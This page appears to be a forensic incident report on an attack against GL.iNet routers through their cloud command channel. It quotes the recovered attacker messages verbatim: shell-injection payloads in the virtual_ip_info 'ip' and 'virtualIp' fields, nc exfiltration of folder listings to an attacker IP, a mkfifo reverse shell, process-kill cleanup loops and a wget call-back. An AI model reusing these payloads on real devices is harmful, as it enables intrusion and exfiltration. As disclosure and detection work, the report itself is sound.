# Every message and command the attacker sent to routers, as recovered from memory

## In short

On 20 November 2026 an attacker misused GL.iNet's cloud service to run shell commands on routers
through the cloud client on the device (`/usr/bin/gl-cloud`). On the routers we manage or own, we
saved the live memory of the cloud client and of the attacker's processes before we stopped
anything. This page lists every distinct message and command we could recover from that
memory, with its exact text.

What it means for an owner: the commands recovered here are **reconnaissance** (listing two folders
and sending the listing out), a **remote shell** (a channel the attacker could type into), commands
that **shut that shell down**, and one **call-back** to another of the attacker's servers. On every
router where we could read the result, the folder the attacker looked for was **not there**. We
found **no** command that installed a file, added an account or key, set a scheduled job, or changed
a boot or configuration file. This page is about the commands sent through the cloud; a separate,
older implant on some routers is covered elsewhere in this repository.

This is static analysis: we read saved bytes. Nothing was run, and no server was contacted.

### What a count here means

"Found in memory on N routers" is **not** "sent to N routers". Memory holds only what was still
there when we copied it. A router that restarted after the attack has clean memory, so finding
nothing on a router proves nothing about what it received. The real number of routers contacted is
at least these counts and is not knowable from memory alone.

## How a command reaches the shell

The cloud client has a handler for the cloud command `virtual_ip_info`. For each element of the
message's `astrowarp.virtual_ip_info.data` array it builds this command and runs it through a shell:

```
iptables -t nat -A SDWAN_IP_MAPPING -d <virtualIp> -j DNAT --to-destination <ip>
```

`<virtualIp>` and `<ip>` are two fields taken straight from the message. Because the result is run
by a shell, either field can carry shell metacharacters. We saw both injection points used:

- **Through `ip`** (every message except C8). The attacker sets `ip` to `127.0.0.1;<command>`.
  The iptables line runs harmlessly against `127.0.0.1`, then the `;` starts `<command>`.
- **Through `virtualIp`** (C8). The attacker sets `virtualIp` to `;<command> ... #`. The leading
  `;` ends the iptables command, `<command>` runs, and the trailing `#` comments out the rest of
  the built line (the `-j DNAT --to-destination <ip>` tail), so it is ignored.

**How it is known:** Verified — we read the handler building this string and read the messages that
drove it in the cloud client's memory on many routers (below).

## The topic a message arrives on, and how to tell the attacker's from GoodCloud's own

*Added 23 November 2026.* The cloud client keeps each message in memory together with the name of
the channel (the MQTT "topic") it arrived on. In the 147 cloud-client images (143 first captures
and 4 second captures) we recovered 1,495 framed messages with their topics. Every image holds at
least one. For 75 of them, all replies from the router, only the topic could be read and not the
body; every request was read in full.

The attacker's message arrives on, and the router answers on:

```
/sys/<model>/<version>/<device id>/command/astrowarp/virtual_ip_info/request
/sys/<model>/<version>/<device id>/command/astrowarp/virtual_ip_info/respond
```

`<model>` is the model in lower case without "GL-" (`mt6000`, `axt1800`), `<version>` is the
firmware version (`4.8.3`), and `<device id>` is the router's hardware address as twelve
hexadecimal characters. This matches GL.iNet's own report, which says the attacker needs to know a
device's MAC address ([GL.iNet's statements](gl-statements.md#glinets-published-vulnerability-reports)).

Every topic recovered, with the part after `/sys/<model>/<version>/<device id>/`:

| Topic | Messages | Images | Models |
|---|---|---|---|
| `command/goodcloud/bind_goodcloud/request` | 716 | 93 | 11 |
| `command/astrowarp/server_latency_detection/request` | 388 | 100 | 11 |
| **`command/astrowarp/virtual_ip_info/request`** | **187** | **123** | **11** |
| **`command/astrowarp/virtual_ip_info/respond`** | **114** | **52** | **9** |
| `command/base/rpc/request` | 21 | 13 | 5 |
| `command/astrowarp/server_latency_detection/respond` | 21 | 21 | 5 |
| `attribute/get_respond` | 14 | 6 | 3 |
| `command/base/rpc/respond` | 11 | 4 | 3 |
| `attribute/get_request` | 9 | 7 | 4 |
| `command/goodcloud/bind_goodcloud/respond` | 7 | 7 | 2 |
| `command/goodcloud/rtty_run/request` | 2 | 2 | 2 |
| `command/wg_server/get_status/respond` | 2 | 1 | 1 |
| `command/wg_server/get_status/request` | 1 | 1 | 1 |
| `command/dpi/get_top_app_flow_statistics/request` | 1 | 1 | 1 |
| `command/dpi/get_top_app_flow_statistics/respond` | 1 | 1 | 1 |

These count framed copies only. The partial, re-encoded copies described in the next
section are counted in the per-command figures further down, not here.

**All 187 `virtual_ip_info` requests carry an injected command. We recovered no ordinary one.**

**The attacker's messages are written differently from every other command on the channel.** All
1,129 command requests on the other topics have the same form: no spaces, an `id` that is a string
of 32 hexadecimal characters, and a `ts` field:

```
{"<module>":{"<method>":{ ... }},"id":"<32 hexadecimal characters>","ts":<number>}
```

All 187 `virtual_ip_info` requests have this form instead: a space after each colon and comma, `id`
first and equal to the number `1`, and no `ts` field:

```
{"id": 1, "astrowarp": {"virtual_ip_info": {"data": [ ... ]}}}
```

So in a log of this channel, a request on a `virtual_ip_info/request` topic with `"id": 1` and no
`ts` is the attacker's. The router copies the `id` into its answer, which is why the replies R1 and
R2 below carry `"id":1`.

**The other topics hold ordinary GoodCloud traffic, as far as their content shows.** The
`base/rpc` requests ask for the router's status (14), a modem's signal readings (4) and a ping of
one of GL.iNet's own remote-terminal hosts (3). The two `rtty_run` requests name that same
GL.iNet host. We do not know who sent them; nothing in them carries a command, and they have the
ordinary form above.

**How it is known:** Verified, by reading the framed messages in the 147 images. Limit: we see
what was still in memory when each image was saved, not everything that was ever sent.

## The forms a message takes in memory

The same message text appears in memory in more than one form, and our analysis read all of them:

1. **Plain frame.** On most models the message arrives in a frame that begins with `47 4c` ("GL"),
   a one-byte type `0x02` and a two-byte length, then the JSON body. Read directly.
2. **A second frame type, `0x32`.** On the GL-MT3000 the message arrives in frames of this type.
   We could read these as well. How is part of the one item we are withholding (see the README),
   so it is not described here, and the public tool below does not read this frame type.
3. **Re-encoded copy.** After receiving a request the client re-encodes its `data` object (with
   the `/` characters escaped as `\/`) into a reused buffer. A later, shorter message overwrites
   the head of that buffer and leaves the tail of an earlier, longer one in place, so these copies
   read newest-first and are often partial. We classified these remnants too.

**How it is known:** Verified. The message text recovered from all three forms is the same.

## The messages and commands

Device identifiers are shown as `<id>`, an owner's own address as `<ip>`, and a per-router port as
`<port>`. Everything the attacker chose is shown exactly: the address `170.39.226.219`, the address
`66.245.219.252`, ports, paths, markers and commands.

### C1 — folder reconnaissance (the 401-byte probe)

**Verified**, found in memory on **98 routers** (a complete copy on 97; one carried only a
distinctive remnant). Full message, one `data` element:

```json
{"id": 1, "astrowarp": {"virtual_ip_info": {"data": [{"mac": "", "virtualIp": "127.0.0.1", "ip": "127.0.0.1;(echo MKX<id>; echo \"===S===\"; ls -ld /etc/config/.gl 2>&1; echo \"===L===\"; ls -la /etc/config/.gl 2>&1 | head -40; echo \"===C===\"; ls -la /etc/glinet/.cache 2>&1 | head -20; echo \"LL<id>\n===E===\"; echo EE<id>) | nc 170.39.226.219 50000 >/dev/null 2>&1 &"}]}}}
```

What it does: lists the folders `/etc/config/.gl` and `/etc/glinet/.cache` (used by the separate
"gl-helper" implant), tags the output with the device id and the markers `MKX`, `===S===`,
`===L===`, `===C===`, `LL`, `===E===`, `EE`, and pipes it to the attacker at `170.39.226.219` port
`50000`. It is run in the background and writes nothing to the device. It is a check for an implant;
on every router where we recovered the output, the folder was absent.

This probe reached far more than the seven routers first reported. The models and firmware, by
router count:

| Model | Routers | Firmware (count) |
|---|---|---|
| GL-MT5000 | 22 | 4.8.6 (6), 4.9.0 (16) |
| GL-MT6000 | 19 | 4.7.7 (2), 4.8.2 (5), 4.8.3 (8), 4.8.4 (1), 4.9.0 (3) |
| GL-MT2500 | 19 | 4.7.0 (2), 4.7.4 (5), 4.7.13 (11), 4.9.0 (1) |
| GL-MT3000 | 18 | 4.7.4 (2), 4.8.0 (1), 4.8.1 (11), 4.8.2 (1), 4.9.0 (3) |
| GL-MT3600BE | 8 | 4.8.5 (2), 4.9.0 (4), 4.9.1 (2) |
| GL-BE3600 | 4 | 4.8.1 (3), 4.8.3 (1) |
| GL-AX1800 | 2 | 4.8.3 (2) |
| GL-AXT1800 | 2 | 4.7.0 (2) |
| GL-BE9300 | 2 | 4.8.4 (1), 4.9.0 (1) |
| GL-BE10000 | 1 | 4.8.6 (1) |
| GL-BE6500 | 1 | 4.8.7 (1) |

(Total 98. These are routers whose saved memory still held the probe; see "What a count means".)

### C2 — short reconnaissance variant

**Verified**, complete copy on **14 routers** (GL-AXT1800: 4.8.2 ×8, 4.8.3 ×6).

```json
{"id": 1, "astrowarp": {"virtual_ip_info": {"data": [{"mac": "", "virtualIp": "127.0.0.1", "ip": "127.0.0.1;(echo MKX<id>; ls -ld /etc/config/.gl 2>&1; echo LL<id>; ls -la /etc/config/.gl 2>&1 | head -30; echo EE<id>) | nc 170.39.226.219 50000 >/dev/null 2>&1 &"}]}}}
```

Same idea as C1, shorter: no `/etc/glinet/.cache` listing, `head -30`, and only the `MKX`/`LL`/`EE`
tags. Sent to the older GL-AXT1800 firmware line.

### C3 — short reconnaissance, synchronous

**Verified**, complete copy on **3 routers** (GL-AXT1800 4.8.2).

```json
{"id": 1, "astrowarp": {"virtual_ip_info": {"data": [{"mac": "", "virtualIp": "127.0.0.1", "ip": "127.0.0.1;(echo MKX<id>; ls -ld /etc/config/.gl 2>&1; echo LL<id>; ls -la /etc/config/.gl 2>&1 | head -30; echo EE<id>) | nc -w 6 170.39.226.219 50000"}]}}}
```

The same listing as C2, but the send uses `nc -w 6` and the command is not backgrounded and has no
`>/dev/null`, so the handler waits up to six seconds for the send to finish.

### C4 — reverse shell

**Verified**, found in cloud-client memory on **11 routers** (GL-AXT1800 4.8.2 ×6, 4.8.3 ×2;
GL-MT6000 4.9.1 ×3). Reverse-shell processes themselves were captured on **23 routers** (see
"The reverse shells" below).

```json
{"id": 1, "astrowarp": {"virtual_ip_info": {"data": [{"mac": "", "virtualIp": "127.0.0.1", "ip": "127.0.0.1;(while true;do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 170.39.226.219 <port> >/tmp/f;sleep 3;done) >/dev/null 2>&1 &"}]}}}
```

A standard reverse shell: it makes a named pipe `/tmp/f`, feeds it to an interactive shell, sends
the shell's output through `nc` to `170.39.226.219` on a per-router port `<port>`, and retries every
three seconds. This gives the attacker an interactive command line on the router.

### C5 — shut down the reverse shell with `pkill` (the 249-byte message)

**Verified**, found on **19 routers**, all GL-AXT1800 (4.8.2 ×11, 4.8.3 ×8).

```json
{"id": 1, "astrowarp": {"virtual_ip_info": {"data": [{"mac": "", "virtualIp": "127.0.0.1", "ip": "127.0.0.1;pkill -9 -f \"mkfifo /tmp/[f]\"; pkill -9 -f \"/tmp/.l[p]\"; pkill -9 -f \"cat /tmp/[f]\"; pkill -9 -f \"nc 170.39.226.21[9]\"; sleep 1"}]}}}
```

It kills the reverse shell's own parts by pattern: `mkfifo /tmp/f`, a process `/tmp/.lp`,
`cat /tmp/f`, and `nc 170.39.226.219`. The brackets around one character (for example `/tmp/[f]`)
stop the `pkill` pattern from matching the `pkill` command itself. `pkill` is **not present** on this
firmware, so on these routers this message does nothing; C6 and C7 are the versions that avoid
`pkill`. Note the `/tmp/.lp` target: the attacker expected a process called `/tmp/.lp`. We did not
observe any such process (see "What we searched for and did not find").

### C6 — shut down the reverse shell by walking `/proc`

**Verified** (full text from one complete copy; a re-encoded remnant of it on nine more), **10
routers**, all GL-AXT1800 (4.8.2 ×7, 4.8.3 ×3). The command, as it reaches the shell:

```sh
127.0.0.1;for d in /proc/[0-9]*; do p=${d#/proc/}; [ "$p" = "$$" ] && continue; grep -qa 'mkfifo /tmp/[f]' $d/cmdline 2>/dev/null && kill -9 $p 2>/dev/null; grep -qa 'nc 170.39.226.21[9]' $d/cmdline 2>/dev/null && kill -9 $p 2>/dev/null; grep -qa 'cat /tmp/[f]' $d/cmdline 2>/dev/null && kill -9 $p 2>/dev/null; done
```

The same cleanup without `pkill`: it reads every process's command line under `/proc`, skips its own
process, and `kill -9`s any that match the reverse shell's patterns. This is the cleanup that works
on GL-AXT1800, which has no `pkill`.

### C7 — shut down the reverse shell with a `case` statement (fragments only)

**Verified as present, text not determined.** Flagged on **5 routers** (GL-AXT1800 4.8.2 ×2,
4.8.3 ×3). No complete copy survived; the buffer was overwritten, leaving only these pieces:

```
case "$    kfifo /    "cat /t    nc 170.    9"*) ki    2>/dev/    ac; don
```

These are consistent with a third cleanup — a `case "$..." in ...) kill` that matches the same
reverse-shell patterns (`mkfifo /`, `cat /tmp/f`, `nc 170.39.226.219`). The full text is **not
determined**.

### C8 — call-back to a second attacker server with `wget`

**Verified** at the level of each array element (each read exactly); found on **1 router**
(GL-AXT1800 4.8.2), which also received C2 and C5. The enclosing message is partly overwritten, so
its full length is not certain; at least four identical elements were recovered. One element:

```json
{"ip": "<ip>", "virtualIp": ";wget -q -T 4 -O- 'http://66.245.219.252:8899/wake?m=KK_<id>' >/dev/null 2>&1 #"}
```

This injects through `virtualIp` (see "How a command reaches the shell"). It makes a four-second
HTTP request to `http://66.245.219.252:8899/wake?m=KK_<id>`, with the device id as the `m=` value,
and **discards the response** (`-O- ... >/dev/null`). It saves nothing, runs nothing further, and
starts no process: it is a liveness call-back, not a download or a second stage. The `ip` fields of
the elements held the router's own addresses, which the trailing `#` discards.

**Why this matters.** Forum user rdizzie reported
([post 101](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/101))
that the KVM implant ("gl-helper") reports to `66.245.219.252:8899/wake?m=DG_...`. That is
**Reported**, not checked by us; see [the KVM implant](gl-helper-implant.md). C8 is a call to the **same server, the same port `8899`, and the
same `/wake?m=` path** from a router, differing only in the prefix (`KK_` here, `DG_` there), and it
was sent through GL.iNet's cloud command channel. This ties the router commands and the KVM implant
to one server. We draw no conclusion about who the attacker is.

### R1 and R2 — the device's own replies

Not attacker commands; these are the router's answers to the cloud, included so researchers can
recognise them. **Verified.**

- **R1**, on **32 routers** (4.8.6–4.9.1 models) — the reply to a `virtual_ip_info` request, empty
  result (key order varies):

```json
{"astrowarp":{"virtual_ip_info":[]},"code":0,"id":1,"time":<ms>}
```

- **R2**, on **68 routers** (older firmware lines; a complete copy on 19, the rest as remnants) —
  the reply with an empty `astrowarp`, carrying a millisecond timestamp:

```json
{"id":1,"astrowarp":[],"code":0,"time":<ms>}
```

## The reverse shells (process memory)

On **23 routers** we captured the memory of the reverse-shell processes — the `sh -c` loop from C4
and its `cat /tmp/f`, `/bin/sh -i` and `nc` children. **106** of those process images were readable;
**24** were captured after the process had already exited and held nothing (listed as not scanned).

**Ports.** Each router's reverse shell used its own port to `170.39.226.219`, in the range
30000–45000; across all routers there were **23 distinct ports** (one per router), plus port
**50000**, which is the reconnaissance exfiltration port (C1–C3), not a shell. We do not publish
which router used which port.

**What was typed in.** The only attacker input found in any shell is a folder survey, typed by hand
into the interactive shell. It is the C1 idea in interactive form (the `===S===`/`===L===`/`===E===`
markers, no `.cache` listing, no `MKX`/`EE` tags). Verbatim:

```sh
echo ===S===; ls -ld /etc/config/.gl 2>&1; echo ===L===; ls -la /etc/config/.gl 2>&1 | head -40; echo ===E===
```

- **36** shell images hold this typed survey.
- **18** shell images hold its output, which is `/etc/config/.gl: No such file or directory` — the
  implant folder was absent.
- **No other input** was found in any shell: no other command, no download, nothing.

**How we told input from output.** A process's own command line and environment sit at the top of
the stack (the `sh -c ...` loop text, `PATH=`, the program name); those are the malware's own text,
not keystrokes. Attacker input is a whole command line that the interactive shell copied into its
heap line-editor buffers (and the shell variable `_`, which holds the last argument of the last
command run — we saw `_=/etc/config/.gl`), and the same bytes in the `cat` process's read buffer,
which is what arrived from the network. Output is text in the `nc` process's buffer on its way to
the socket and in the shell's own output buffers — the BusyBox banner, the `~ # ` prompt, and the
`No such file or directory` error.

## What we searched for and did not find

Stated as searches over the saved images (143 cloud-client images, 112 reverse-shell images in the
main set; the searches below cover all of them):

- No match for `65.20.71.131` — the second address reported elsewhere for this incident — in any of
  the 255 memory images. The only attacker addresses present are `170.39.226.219` (all shells and
  all reconnaissance) and `66.245.219.252` (the C8 call-back).
- No match for a process or file `/tmp/.lp` in the 106 readable shell images; the string `/tmp/.lp`
  occurs only inside the C5 kill pattern.
- No match for `wget`, `curl` or `tftp` as input typed into any of the 106 shell images.
- No recovered message writes a file, installs a package, adds an account or key, writes a scheduled
  job, or changes a boot or configuration file.
- No domain names: the attacker used bare IPv4 addresses throughout.

## Totals

- Cloud-client memory images read: **143**, plus 4 second captures. Reverse-shell process images:
  **112** in the main set (91 readable, 21 captured empty) plus **18** from second captures, 106
  readable in all. Text state captures scanned: 318.
- Distinct attacker messages recovered: eight (C1–C8), of which four — C2, C3, C6 and C8 — were not
  in the material first published; plus the two device replies (R1, R2).
- Activity window: the device replies that bracket these calls carry timestamps from **20 November
  2026 20:06:35 UTC to 21 November 2026 08:04:42 UTC**.

**How the times are known:** Verified on our samples. Each device reply carries its own
millisecond timestamp (UTC); the window above is the range of those timestamps. The calls arrived in
batches that track model and firmware rather than owner — for example the GL-MT3000 reconnaissance
near 00:21, the GL-MT5000 near 01:41 and again near 06:45, the GL-MT3600BE near 04:39 (all 21
November), and the GL-AXT1800 reverse shells between 20:46 and 21:39 on 20 November — established
from each router's own process start times and the creation time of the handler's state file
`/etc/mp_ip_mapping_info`.

## Limits

- Static analysis only. We read saved bytes; nothing was executed and no server was contacted.
- Memory shows what a router received, not that the command ran. Where a reverse-shell process or
  its output was also captured, we can say it ran; otherwise we cannot.
- A restart clears the cloud client's memory, so "not found on a router" is not evidence that the
  router received nothing. Counts here are lower bounds.
- Process start times assume the kernel clock runs at 100 ticks per second (confirmed on GL-AXT1800,
  assumed for other models). A router that boots without a synchronised clock can carry a time
  offset until it reaches a time server.
- C7's full text is not determined (fragments only). C8's full message length is not certain (at
  least four elements; each element's command is verified).
- A frame that was cut short or partly overwritten is reported as not decoded, never guessed.

## Tool

[`tools/memory-scan/scan-cloud-shell-memory.py`](../tools/memory-scan/scan-cloud-shell-memory.py)
(Python 3, standard library, GPL-3.0-or-later) finds and classifies these messages in a saved
memory image of the cloud client, and lists what was typed into a reverse shell from the shell
processes' images. Its header describes the simple index format it expects beside each image. It
reads the plain frame type and the re-encoded copies, not frame type `0x32`, so on a GL-MT3000 it
finds fewer copies than we did: run over our own images it finds the folder check on 97 routers
where we count 98, and the `pkill` message on 13 where we count 19.

*Added 23 November 2026. Part of [the incident pages](../README.md). Times are UTC.*
